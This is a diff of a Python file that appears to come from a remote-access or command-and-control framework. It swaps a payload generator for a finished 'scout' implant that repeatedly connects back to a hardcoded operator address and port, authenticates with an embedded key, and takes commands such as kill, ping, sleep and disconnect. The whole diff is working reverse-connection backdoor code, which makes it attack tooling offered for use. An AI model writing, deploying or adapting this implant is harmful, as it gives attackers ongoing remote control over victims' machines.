@@ -1,25 +1,19 @@
-import library.modules.config as config
-import library.modules.safe_open as safe_open
-import os
-from datetime import datetime
+import socket
+from time import sleep
+from os import _exit
 
-config.main()
+help_menu = '''
+Scout Help Menu
+===============
+   Base Commands :
+      disconnect        Disconnects the scout
+      flush <timeout>   Flush the socket buffer, the socket timeout argument is optional and defaults to 5 for the socket timeout in flushing
+      help              Show the help menu or help for specific command, alias of the command is "?"
+      kill              Kills the scout
+      ping              Ping the scout
+      sleep             Make the scout disconnect and sleep for a specified amount of time
+'''
 
-
-def main(option):
-    if option == 'generate':
-        host = config.scout_values['Host'][0]
-        port = config.scout_values['Port'][0]
-        key = config.key
-        timeout = config.scout_values['Timeout'][0]
-        config.local_time_dir = os.path.join(config.scout_values['Dir'][0], datetime.now().strftime("%Y-%m-%d_%H-%M-%S"))
-        filepath = os.path.join(config.local_time_dir, 'payload.py')
-        config.import_statements.append('import socket')
-        config.import_statements.append('from os import _exit')
-        config.import_statements.append('from time import sleep')
-        with safe_open.main(filepath, 'w') as f:
-            host = str(host.replace(' ','').split(','))
-            f.write(f'''
 def recv_all(sock):
     sock.settimeout(None)
     try:
@@ -55,16 +49,16 @@ def send_all(sock, data):
         sock.sendall((str(len(data)) + "|" + data).encode())
     except TypeError:
         sock.sendall(str(len(data)).encode() + b"|" + data)
-host_list = {host}
+host_list = ['192.168.1.128']
 while True:
     connected = False
     while True:
         for i in host_list:
             try:
                 s = socket.socket()
-                s.settimeout({timeout})
-                s.connect((i,{port}))
-                send_all(s,'{key}')
+                s.settimeout(5)
+                s.connect((i,9999))
+                send_all(s,'KTJT^o%dT(1WD^&Q8!!@z15T1EaT6KyGtsUIKFcLRP88%JxEhb')
                 connected = True
                 break
             except (socket.timeout,socket.error):
@@ -91,10 +85,10 @@ while True:
             elif command == 'disconnect':
                 send_all(s,'[*]Scout is disconnecting itself...')
                 sleep(3)
-                break#Statements#
+                break
             else:
                 send_all(s,'[-]Scout does not have the capability to run this command. (Was it loaded during generation?)')
-        except (socket.error,socket.timeout,ConnectionResetError):
+        except (socket.error,socket.timeout,ConnectionResetError) as e:
             try:
                 if type(e) not in (socket.error,socket.timeout,ConnectionResetError):
                     raise e
@@ -107,11 +101,4 @@ while True:
         except IndexError:
             send_all(s,'[-]Please supply valid arguments for the command you are running')
         except Exception as e:
-            send_all(s,'[!]Error in scout : ' + str(e))''')
-    elif option == 'info':
-        print('\nName             : Reverse TCP Base component' \
-              '\nOS               : Linux' \
-              '\nRequired Modules : socket, time' \
-              '\nCommands         : kill, ping, sleep <time>, disconnect' \
-              '\nDescription      : The base component of the scout, it allows it to connect back to the server and supports connection status commands' \
-              '\nConnection type  : Reverse\n')
+            send_all(s,'[!]Error in scout : ' + str(e))
